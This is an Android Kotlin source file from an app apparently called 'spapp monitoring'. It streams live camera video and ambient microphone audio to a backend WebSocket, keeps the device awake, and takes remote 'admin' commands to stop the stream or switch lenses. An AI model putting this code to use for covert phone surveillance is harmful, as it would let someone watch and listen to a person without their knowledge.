package com.spapp.monitoring.camerastream

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.util.Log
import android.util.Size
import androidx.core.content.ContextCompat
import com.spapp.monitoring.BuildConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString.Companion.toByteString
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Manages low-latency live camera (front and back) and ambient audio streaming from the Android device
 * to the backend WebSocket relay.
 *
 * Latency & Performance Architecture:
 * 1. Native Camera2 ImageReader stream with JPEG capture target (~640x480).
 * 2. Dedicated camera background thread prevents UI stutter.
 * 3. Backlog protection: drops frames when WebSocket outgoing queue builds up.
 * 4. Partial WakeLock prevents CPU/network throttling during active streaming.
 * 5. Live ambient audio: 16kHz 16-bit PCM streaming (packet type 0x02) when RECORD_AUDIO is granted.
 * 6. Dynamic lens flipping: supports instant switching between front and back camera without tearing down the connection.
 */
object CameraStreamManager {

    private const val TAG = "CameraStreamManager"

    // Packet type indicators
    private const val PACKET_TYPE_VIDEO: Byte = 0x01
    private const val PACKET_TYPE_AUDIO: Byte = 0x02

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var audioJob: Job? = null
    private var activeWebSocket: WebSocket? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val isStreaming = AtomicBoolean(false)

    private var currentLens = "back"
    private var activeContext: Context? = null
    private var onStoppedCallback: (() -> Unit)? = null

    // Camera2 resources
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null

    private val wsBaseUrl: String by lazy {
        BuildConfig.API_BASE_URL
            .replaceFirst("http://", "ws://")
            .replaceFirst("https://", "wss://")
            .trimEnd('/')
    }

    @Synchronized
    fun startStreaming(
        context: Context,
        authToken: String,
        deviceId: String,
        initialLens: String = "back",
        onStreamStopped: (() -> Unit)? = null
    ) {
        val hasCameraPermission = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasCameraPermission) {
            Log.w(TAG, "CAMERA permission is missing — cannot start camera stream")
            return
        }

        activeContext = context.applicationContext
        currentLens = if (initialLens == "front") "front" else "back"
        onStoppedCallback = onStreamStopped

        // If streaming is already active, just switch the lens if requested
        if (isStreaming.get() && activeWebSocket != null) {
            Log.d(TAG, "Camera stream session already active — switching lens to $currentLens")
            switchLens(currentLens)
            return
        }

        stopStreaming()

        isStreaming.set(true)

        // Acquire WakeLock to prevent CPU sleep during active streaming
        try {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "spapp:CameraStreamWakeLock")?.apply {
                setReferenceCounted(false)
                acquire(15 * 60 * 1000L) // 15 minutes safety auto-release
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to acquire WakeLock", e)
        }

        startBackgroundThread()

        val client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .pingInterval(10, TimeUnit.SECONDS)
            .build()

        val url = "$wsBaseUrl/ws/camera-stream?role=device&token=$authToken&deviceId=$deviceId&lens=$currentLens"
        val request = Request.Builder().url(url).build()

        activeWebSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Camera stream WebSocket connected for lens: $currentLens")
                openCamera(context, currentLens, webSocket)
                startAudioLoop(context, webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    val action = json.optString("action")
                    if (action == "stop") {
                        Log.d(TAG, "Received stop signal from admin")
                        if (activeWebSocket == webSocket) {
                            stopStreaming()
                        }
                    } else if (action == "switch_lens") {
                        val newLens = json.optString("lens", "back")
                        Log.d(TAG, "Received switch_lens signal to: $newLens")
                        switchLens(newLens)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing camera WS message", e)
                }
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "Camera WebSocket closing: $code / $reason")
                if (activeWebSocket == webSocket) {
                    stopStreaming()
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "Camera WebSocket failure: ${t.message}, response: ${response?.code}")
                if (activeWebSocket == webSocket) {
                    stopStreaming()
                }
            }
        })
    }

    @Synchronized
    fun switchLens(newLens: String) {
        val normalized = if (newLens == "front") "front" else "back"
        currentLens = normalized
        val context = activeContext ?: return
        val ws = activeWebSocket ?: return

        cameraHandler?.post {
            closeCameraDevice()
            openCamera(context, normalized, ws)
            try {
                val confirmJson = JSONObject().apply {
                    put("type", "lens_switched")
                    put("lens", normalized)
                }
                ws.send(confirmJson.toString())
            } catch (e: Exception) {
                Log.w(TAG, "Failed to send lens_switched confirm", e)
            }
        }
    }

    @Synchronized
    fun stopStreaming() {
        if (!isStreaming.getAndSet(false)) {
            val ws = activeWebSocket
            activeWebSocket = null
            try {
                ws?.close(1000, "stream stopped")
            } catch (_: Exception) {}
            closeCameraDevice()
            stopBackgroundThread()
            return
        }

        Log.d(TAG, "Stopping camera stream")

        audioJob?.cancel()
        audioJob = null

        val ws = activeWebSocket
        activeWebSocket = null
        try {
            ws?.close(1000, "stream stopped")
        } catch (_: Exception) {}

        closeCameraDevice()
        stopBackgroundThread()

        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}
        wakeLock = null

        val cb = onStoppedCallback
        onStoppedCallback = null
        cb?.invoke()
    }

    private fun startBackgroundThread() {
        if (cameraThread == null) {
            cameraThread = HandlerThread("CameraBackground").apply { start() }
            cameraHandler = Handler(cameraThread!!.looper)
        }
    }

    private fun stopBackgroundThread() {
        cameraThread?.quitSafely()
        try {
            cameraThread?.join(500)
        } catch (_: Exception) {}
        cameraThread = null
        cameraHandler = null
    }

    @SuppressLint("MissingPermission")
    private fun openCamera(context: Context, lens: String, ws: WebSocket) {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
        val targetFacing = if (lens == "front") {
            CameraCharacteristics.LENS_FACING_FRONT
        } else {
            CameraCharacteristics.LENS_FACING_BACK
        }

        var selectedCameraId: String? = null
        var selectedSize = Size(640, 480)

        try {
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    selectedCameraId = id

                    val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                    val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG)
                    if (!jpegSizes.isNullOrEmpty()) {
                        // Pick optimal preview size close to 640x480
                        selectedSize = jpegSizes
                            .filter { it.width in 400..960 && it.height in 300..720 }
                            .minByOrNull { Math.abs(it.width * it.height - 640 * 480) }
                            ?: jpegSizes.first()
                    }
                    break
                }
            }

            // Fallback if specific facing is missing
            if (selectedCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                selectedCameraId = cameraManager.cameraIdList[0]
            }

            if (selectedCameraId == null) {
                Log.w(TAG, "No suitable camera found on device")
                return
            }

            Log.d(TAG, "Opening camera $selectedCameraId ($lens) with size: ${selectedSize.width}x${selectedSize.height}")

            imageReader = ImageReader.newInstance(selectedSize.width, selectedSize.height, ImageFormat.JPEG, 2).apply {
                setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    try {
                        val planes = image.planes
                        if (planes.isNotEmpty()) {
                            val buffer = planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)

                            if (isStreaming.get() && ws.queueSize() <= 48 * 1024) {
                                val packet = ByteArray(1 + bytes.size)
                                packet[0] = PACKET_TYPE_VIDEO
                                System.arraycopy(bytes, 0, packet, 1, bytes.size)
                                ws.send(packet.toByteString())
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error handling camera frame", e)
                    } finally {
                        image.close()
                    }
                }, cameraHandler)
            }

            cameraManager.openCamera(selectedCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCameraCaptureSession(camera)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "Camera device disconnected")
                    camera.close()
                    if (cameraDevice == camera) cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera device error: $error")
                    camera.close()
                    if (cameraDevice == camera) cameraDevice = null
                }
            }, cameraHandler)

        } catch (e: Exception) {
            Log.e(TAG, "Failed to open camera: ${e.message}", e)
        }
    }

    private fun createCameraCaptureSession(camera: CameraDevice) {
        val readerSurface = imageReader?.surface ?: return
        try {
            val captureRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                addTarget(readerSurface)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
            }

            camera.createCaptureSession(
                listOf(readerSurface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        if (cameraDevice == null || !isStreaming.get()) return
                        captureSession = session
                        try {
                            session.setRepeatingRequest(captureRequestBuilder.build(), null, cameraHandler)
                            Log.d(TAG, "Camera repeating capture request active")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to start camera repeating request", e)
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Camera capture session configuration failed")
                    }
                },
                cameraHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error creating camera capture session", e)
        }
    }

    private fun closeCameraDevice() {
        try {
            captureSession?.stopRepeating()
            captureSession?.close()
        } catch (_: Exception) {}
        captureSession = null

        try {
            cameraDevice?.close()
        } catch (_: Exception) {}
        cameraDevice = null

        try {
            imageReader?.close()
        } catch (_: Exception) {}
        imageReader = null
    }

    private fun startAudioLoop(context: Context, ws: WebSocket) {
        audioJob?.cancel()

        val hasPermission = ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasPermission) {
            Log.d(TAG, "RECORD_AUDIO permission not granted; streaming silent camera video only")
            return
        }

        audioJob = scope.launch(Dispatchers.IO) {
            var recorder: AudioRecord? = null
            try {
                val sampleRate = 16000
                val channelConfig = AudioFormat.CHANNEL_IN_MONO
                val audioFormat = AudioFormat.ENCODING_PCM_16BIT
                val minBufSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
                val bufferSizeInBytes = maxOf(minBufSize, 3200)

                recorder = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSizeInBytes
                )

                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    Log.w(TAG, "AudioRecord failed to initialize")
                    return@launch
                }

                recorder.startRecording()
                Log.d(TAG, "Camera ambient audio streaming started (16kHz PCM)")

                val chunkSize = 1600
                val pcmBuffer = ShortArray(chunkSize)
                val bytePayload = ByteArray(1 + chunkSize * 2)
                bytePayload[0] = PACKET_TYPE_AUDIO

                while (isActive && isStreaming.get()) {
                    val readShorts = recorder.read(pcmBuffer, 0, chunkSize)
                    if (readShorts > 0 && isStreaming.get()) {
                        if (ws.queueSize() > 64 * 1024) continue

                        var idx = 1
                        for (i in 0 until readShorts) {
                            val sample = pcmBuffer[i].toInt()
                            bytePayload[idx++] = (sample and 0xFF).toByte()
                            bytePayload[idx++] = ((sample shr 8) and 0xFF).toByte()
                        }
                        ws.send(bytePayload.toByteString(0, idx))
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Camera audio stream error", e)
            } finally {
                try {
                    recorder?.stop()
                    recorder?.release()
                } catch (_: Exception) {}
                Log.d(TAG, "Camera audio stream stopped")
            }
        }
    }
}
